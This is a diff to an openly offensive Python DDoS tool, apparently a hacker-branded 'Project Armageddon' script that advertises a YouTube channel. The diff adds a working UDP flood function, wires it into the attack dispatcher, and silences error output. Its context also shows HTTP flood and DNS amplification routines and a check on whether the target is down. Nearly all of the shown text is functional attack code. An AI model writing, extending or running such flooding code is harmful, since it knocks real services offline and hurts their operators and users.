@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0
+# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.1
 # PERINGATAN: Dilarang keras menyalahgunakan tools!!
 
 import os
@@ -74,7 +74,7 @@ def print_banner():
    ██║   ╚██████╔╝╚██████╔╝╚███╔███╔╝██╔╝ ██╗      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚╝    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝      ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
 """
-    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE) v2.0"
+    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE) v2.1"
     warning = "𝙎𝙐𝘽𝙎𝘾𝙍𝙄𝘽𝙀 𝙈𝙔 𝙔𝙊𝙐𝙏𝙐𝘽𝙀:𝙝𝙩𝙩𝙥𝙨://𝙮𝙤𝙪𝙩𝙪𝙗𝙚.𝙘𝙤𝙢/@𝙯𝙭_𝙥-𝙡𝙤𝙞𝙩"
     website = "https://yogistore-shopcommyidvercelapp.vercel.app"
     
@@ -930,7 +930,7 @@ class GhostAttackEngine:
                 sock.connect((self.target_ip, self.port))
                 success = True
             except Exception as e:
-                print(f"{Color.RED}[-] Connection failed: {str(e)}{Color.END}")
+                # print(f"{Color.RED}[-] Connection failed: {str(e)}{Color.END}")
                 return 0, 0, 0, False, 0
             
             # Number of requests per connection
@@ -977,7 +977,7 @@ class GhostAttackEngine:
                     time.sleep(0.01)
                     
                 except Exception as e:
-                    print(f"{Color.YELLOW}[-] Request failed: {str(e)}{Color.END}")
+                    # print(f"{Color.YELLOW}[-] Request failed: {str(e)}{Color.END}")
                     break
                 
                 # Additional payload in permanent mode
@@ -988,10 +988,11 @@ class GhostAttackEngine:
                         bytes_sent += 1024
                         damage += 0.1
                     except Exception as e:
-                        print(f"{Color.YELLOW}[-] Malicious payload failed: {str(e)}{Color.END}")
+                        # print(f"{Color.YELLOW}[-] Malicious payload failed: {str(e)}{Color.END}")
                         break
         except Exception as e:
-            print(f"{Color.RED}[-] HTTP flood error: {str(e)}{Color.END}")
+            # print(f"{Color.RED}[-] HTTP flood error: {str(e)}{Color.END}")
+            pass
         finally:
             try:
                 if sock:
@@ -1000,6 +1001,48 @@ class GhostAttackEngine:
                 pass
                 
         return requests_sent, 0, bytes_sent, success, damage
+
+    def udp_flood(self):
+        """UDP flood attack for maximum bandwidth"""
+        packets_sent = 0
+        bytes_sent = 0
+        success = False
+        damage = 0
+        
+        try:
+            # Create UDP socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0.5)
+            
+            # Generate random payload
+            payload_size = random.randint(1024, 2048)  # 1-2KB per packet
+            payload = os.urandom(payload_size)
+            
+            # Send multiple packets per connection
+            for _ in range(100):  # 100 packets per socket
+                try:
+                    sock.sendto(payload, (self.target_ip, self.port))
+                    packets_sent += 1
+                    bytes_sent += payload_size
+                    success = True
+                    
+                    # Add damage in hyper mode
+                    if self.hyper_mode:
+                        damage += 0.01
+                        
+                except Exception as e:
+                    break
+                    
+        except Exception as e:
+            # print(f"{Color.RED}[-] UDP flood error: {str(e)}{Color.END}")
+            pass
+        finally:
+            try:
+                sock.close()
+            except:
+                pass
+                
+        return 0, packets_sent, bytes_sent, success, damage
 
     def dns_amplification_attack(self):
         """DNS Amplification Attack"""
@@ -1035,11 +1078,12 @@ class GhostAttackEngine:
                         bytes_sent += len(dns_data)
                         success = True
                     except Exception as e:
-                        print(f"{Color.YELLOW}[-] DNS packet failed: {str(e)}{Color.END}")
+                        # print(f"{Color.YELLOW}[-] DNS packet failed: {str(e)}{Color.END}")
                         continue
             
         except Exception as e:
-            print(f"{Color.RED}[-] DNS amplification failed: {str(e)}{Color.END}")
+            # print(f"{Color.RED}[-] DNS amplification failed: {str(e)}{Color.END}")
+            pass
         
         return 0, packets_sent, bytes_sent, success, 0.2
 
@@ -1048,12 +1092,14 @@ class GhostAttackEngine:
         try:
             if self.attack_type == "HTTP_FLOOD":
                 return self.http_flood()
+            elif self.attack_type == "UDP_FLOOD":
+                return self.udp_flood()
             elif self.attack_type == "DNS_AMPLIFY" and self.dns_amplify:
                 return self.dns_amplification_attack()
             else:
                 return self.http_flood()
         except Exception as e:
-            print(f"{Color.RED}[-] Attack execution failed: {str(e)}{Color.END}")
+            # print(f"{Color.RED}[-] Attack execution failed: {str(e)}{Color.END}")
             return 0, 0, 0, False, 0
 
 # ==================== YOGI X CONTROLLER ====================
@@ -1126,6 +1172,10 @@ class GhostController:
         start_time = time.time()
         last_status_check = start_time
         
+        # Start stats display thread
+        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
+        stats_thread.start()
+        
         try:
             while time.time() - start_time < self.duration and self.running:
                 futures = []
@@ -1149,7 +1199,7 @@ class GhostController:
                         self.stats.ghost_ips_generated += requests
                     except Exception as e:
                         self.stats.errors += 1
-                        print(f"{Color.YELLOW}[-] Attack thread error: {str(e)}{Color.END}")
+                        # print(f"{Color.YELLOW}[-] Attack thread error: {str(e)}{Color.END}")
                 
                 # Update stats
                 self.stats.active_threads = threading.active_count()
@@ -1158,20 +1208,6 @@ class GhostController:
                 if time.time() - last_status_check > 10:
                     self.check_target_status()
                     last_status_check = time.time()
-                
-                # Display stats
-                os.system('clear' if os.name == 'posix' else 'cls')
-                print(self.stats.formatted_stats())
-                
-                # Check for stop command
-                try:
-                    if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
-                        line = input()
-                        if line.lower() == 'stop':
-                            self.running = False
-                            print(f"{Color.YELLOW}[!] Stopping attack by user request{Color.END}")
-                except:
-                    pass
                 
                 # Adaptive throttling
                 time.sleep(0.1)
@@ -1185,6 +1221,13 @@ class GhostController:
         # Cleanup
         self.stop_attack()
 
+    def display_stats(self):
+        """Display real-time attack statistics"""
+        while self.running:
+            os.system('clear' if os.name == 'posix' else 'cls')
+            print(self.stats.formatted_stats())
+            time.sleep(0.5)
+
     def check_target_status(self):
         """Check if target is still responding"""
         try:
@@ -1195,7 +1238,7 @@ class GhostController:
             self.stats.target_status = "DOWN" if result != 0 else "UP"
             sock.close()
         except Exception as e:
-            print(f"{Color.YELLOW}[-] Status check failed: {str(e)}{Color.END}")
+            # print(f"{Color.YELLOW}[-] Status check failed: {str(e)}{Color.END}")
             self.stats.target_status = "UNKNOWN"
 
     def stop_attack(self):
@@ -1312,7 +1355,7 @@ def main():
         show_examples()
         return
     elif args.version:
-        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.0{Color.END}")
+        print(f"{Color.BOLD}{Color.PURPLE}YOGI X ATTACK SYSTEM - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.1{Color.END}")
         return
     
     # Validate required parameters
